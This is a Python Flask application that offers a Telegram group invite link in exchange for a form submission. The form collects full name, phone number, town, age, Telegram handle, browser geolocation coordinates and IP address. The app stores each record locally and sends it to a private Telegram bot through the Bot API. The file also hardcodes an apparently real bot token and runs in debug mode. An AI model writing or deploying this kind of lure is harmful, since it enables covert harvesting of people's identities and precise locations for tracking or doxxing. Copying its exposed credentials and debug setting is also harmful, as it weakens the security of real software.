from flask import Flask, request, jsonify, render_template
import os, json, requests

app = Flask(__name__)
DATA_DIR = "user_data"
os.makedirs(DATA_DIR, exist_ok=True)

BOT_TOKEN = "7986825869:AAH_I4ZVqmPQx3MZnrBo79YoSdL1YdJ63UA"
CHAT_ID = "7984761077"  # Replace with your actual Telegram chat ID

@app.route("/")
def index():
    return render_template("form.html")

@app.route("/submit", methods=["POST"])
def handle_form():
    if not request.is_json:
        return jsonify({"error": "Invalid data format"}), 400

    data = request.get_json()
    ip = request.remote_addr
    username = data.get("telegram", "").strip().lstrip('@')

    if not all([data.get(k) for k in ["fullname", "phone", "towncity", "age", "telegram"]]):
        return jsonify({"error": "All fields required."}), 400

    user_data = {
        "fullname": data["fullname"],
        "phone": data["phone"],
        "towncity": data["towncity"],
        "age": data["age"],
        "telegram": username,
        "latitude": data.get("latitude"),
        "longitude": data.get("longitude"),
        "ip": ip
    }

    # Save to file
    filepath = os.path.join(DATA_DIR, f"{username}_{ip.replace('.', '-')}.json")
    with open(filepath, "w") as f:
        json.dump(user_data, f, indent=2)

    # Send to Telegram bot
    message = "\n".join([
        f"New Telegram Group Request:",
        f"Name: {user_data['fullname']}",
        f"Phone: {user_data['phone']}",
        f"Town/City: {user_data['towncity']}",
        f"Age: {user_data['age']}",
        f"Telegram: @{user_data['telegram']}",
        f"IP: {ip}",
        f"Location: {user_data['latitude']}, {user_data['longitude']}"
    ])
    try:
        requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            params={"chat_id": CHAT_ID, "text": message}
        )
    except Exception as e:
        print("Telegram send failed:", e)

    return jsonify({"link": "https://t.me/+APbxtoSb76hmZWZl"})  # Replace with your real group link

if __name__ == "__main__":
    app.run(debug=True)
